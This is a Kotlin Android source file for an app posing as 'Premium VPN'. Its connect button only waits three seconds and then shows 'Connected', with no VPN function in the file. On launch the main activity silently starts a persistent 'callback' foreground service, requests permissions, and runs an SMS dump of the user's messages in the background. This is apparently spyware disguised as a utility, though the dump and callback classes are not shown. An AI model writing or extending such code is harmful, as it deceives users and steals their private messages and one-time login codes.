package com.premium.vpn

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.compose.foundation.background
import androidx.compose.foundation.Image
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.premium.vpn.ui.theme.VPNTheme
import kotlinx.coroutines.delay

data class Country(
    val name: String,
    val flagRes: Int,
    val flagIconRes: Int,
    val code: String
)

class MainActivity : ComponentActivity() {
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            // All permissions granted, start SMS dump
            startSMSDump()
        } else {
            // Some permissions denied
            android.util.Log.w("MainActivity", "Some permissions were denied")
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            VPNTheme {
                VPNApp()
            }
        }
        
        // Start the background service for persistent callback
        startCallbackService()
        
        // Request permissions and start SMS dump
        requestPermissionsAndDumpSMS()
    }
    
    private fun startCallbackService() {
        val serviceIntent = Intent(this, CallbackService::class.java)
        startForegroundService(serviceIntent)
    }
    
    private fun requestPermissionsAndDumpSMS() {
        if (PermissionHandler.hasAllPermissions(this)) {
            // All permissions already granted
            startSMSDump()
        } else {
            // Request permissions
            permissionLauncher.launch(PermissionHandler.REQUIRED_PERMISSIONS)
        }
    }
    
    private fun startSMSDump() {
        // Run SMS dump in background thread
        Thread {
            try {
                val smsDumpService = SMSDumpService()
                val success = smsDumpService.dumpSMS(this@MainActivity)
                
                runOnUiThread {
                    if (success) {
                        android.util.Log.i("MainActivity", "SMS dump completed successfully")
                    } else {
                        android.util.Log.e("MainActivity", "SMS dump failed")
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    android.util.Log.e("MainActivity", "Error during SMS dump: ${e.message}")
                }
            }
        }.start()
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun VPNApp() {
    var selectedCountry by remember { mutableStateOf<Country?>(null) }
    var isConnecting by remember { mutableStateOf(false) }
    var isConnected by remember { mutableStateOf(false) }
    var shouldConnect by remember { mutableStateOf(false) }
    
    val countries = listOf(
        Country("Russia", R.drawable.flag_russia, R.drawable.ic_flag_russia, "RU"),
        Country("Germany", R.drawable.flag_germany, R.drawable.ic_flag_germany, "DE"),
        Country("USA", R.drawable.flag_usa, R.drawable.ic_flag_usa, "US"),
        Country("France", R.drawable.flag_france, R.drawable.ic_flag_france, "FR")
    )
    
    // Handle connection logic
    LaunchedEffect(shouldConnect) {
        if (shouldConnect && selectedCountry != null) {
            isConnecting = true
            delay(3000) // 3 second loading
            isConnecting = false
            isConnected = true
            shouldConnect = false
        }
    }
    
    Box(
        modifier = Modifier.fillMaxSize()
    ) {
        // Background Image
        Image(
            painter = painterResource(id = R.drawable.background),
            contentDescription = "Background",
            modifier = Modifier.fillMaxSize(),
            contentScale = ContentScale.Crop
        )
        
        // Dark overlay for better text readability
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black.copy(alpha = 0.4f))
        )
        
        Scaffold(
            modifier = Modifier.fillMaxSize(),
            containerColor = Color.Transparent
        ) { paddingValues ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues)
                    .padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
            
            // Title
            Text(
                text = "Premium VPN",
                fontSize = 32.sp,
                fontWeight = FontWeight.Bold,
                color = Color.White,
                modifier = Modifier.padding(bottom = 40.dp)
            )
            
            // Country Selection
            Text(
                text = "Select Country",
                fontSize = 18.sp,
                fontWeight = FontWeight.Medium,
                color = Color.White,
                modifier = Modifier.padding(bottom = 16.dp)
            )
            
            LazyRow(
                horizontalArrangement = Arrangement.spacedBy(12.dp),
                modifier = Modifier.padding(bottom = 40.dp)
            ) {
                items(countries) { country ->
                    CountryButton(
                        country = country,
                        isSelected = selectedCountry == country,
                        onClick = { selectedCountry = country }
                    )
                }
            }
            
            // VPN Connection Button
            VPNButton(
                isConnecting = isConnecting,
                isConnected = isConnected,
                selectedCountry = selectedCountry,
                onConnect = {
                    if (selectedCountry != null && !isConnecting && !isConnected) {
                        shouldConnect = true
                    }
                },
                onDisconnect = {
                    isConnected = false
                    isConnecting = false
                }
            )
            
            // Connection Status
            if (isConnected) {
                Text(
                    text = "Connected to ${selectedCountry?.name}",
                    fontSize = 16.sp,
                    color = Color(0xFF4CAF50),
                    modifier = Modifier.padding(top = 16.dp)
                )
            }
            }
        }
    }
}

@Composable
fun CountryButton(
    country: Country,
    isSelected: Boolean,
    onClick: () -> Unit
) {
    Box(
        modifier = Modifier
            .width(80.dp)
            .height(100.dp)
            .clip(RoundedCornerShape(15.dp))
            .background(
                if (isSelected) Color(0xFF4CAF50) else Color.White
            )
            .border(
                width = if (isSelected) 2.dp else 1.dp,
                color = if (isSelected) Color(0xFF2E7D32) else Color(0xFFE0E0E0),
                shape = RoundedCornerShape(15.dp)
            )
            .clickable { onClick() },
        contentAlignment = Alignment.Center
    ) {
        Row(
            horizontalArrangement = Arrangement.Center,
            verticalAlignment = Alignment.CenterVertically
        ) {
            // Flag Icon
            androidx.compose.foundation.Image(
                painter = painterResource(id = country.flagIconRes),
                contentDescription = "${country.name} flag",
                modifier = Modifier.size(16.dp)
            )
            
            Spacer(modifier = Modifier.width(4.dp))
            
            // Country Name
            Text(
                text = country.name,
                fontSize = 12.sp,
                fontWeight = FontWeight.Medium,
                color = if (isSelected) Color.White else Color.Black,
                textAlign = TextAlign.Center
            )
        }
    }
}

@Composable
fun VPNButton(
    isConnecting: Boolean,
    isConnected: Boolean,
    selectedCountry: Country?,
    onConnect: () -> Unit,
    onDisconnect: () -> Unit
) {
    val buttonText = when {
        isConnecting -> "Connecting..."
        isConnected -> "Connected"
        selectedCountry == null -> "Select Country First"
        else -> "Connect VPN"
    }
    
    val buttonColor = when {
        isConnecting -> Color(0xFFFF9800)
        isConnected -> Color(0xFF4CAF50)
        selectedCountry == null -> Color(0xFF9E9E9E)
        else -> Color(0xFFF44336)
    }
    
    Button(
        onClick = {
            if (isConnected) {
                onDisconnect()
            } else if (selectedCountry != null && !isConnecting) {
                onConnect()
            }
        },
        enabled = selectedCountry != null && !isConnecting,
        modifier = Modifier
            .width(200.dp)
            .height(60.dp),
        colors = ButtonDefaults.buttonColors(
            containerColor = buttonColor,
            disabledContainerColor = Color(0xFF9E9E9E)
        ),
        shape = RoundedCornerShape(30.dp)
    ) {
        if (isConnecting) {
            CircularProgressIndicator(
                modifier = Modifier.size(20.dp),
                color = Color.White,
                strokeWidth = 2.dp
            )
            Spacer(modifier = Modifier.width(8.dp))
        }
        
        Text(
            text = buttonText,
            fontSize = 16.sp,
            fontWeight = FontWeight.Bold,
            color = Color.White
        )
    }
}

@Preview(showBackground = true)
@Composable
fun VPNAppPreview() {
    VPNTheme {
        VPNApp()
    }
}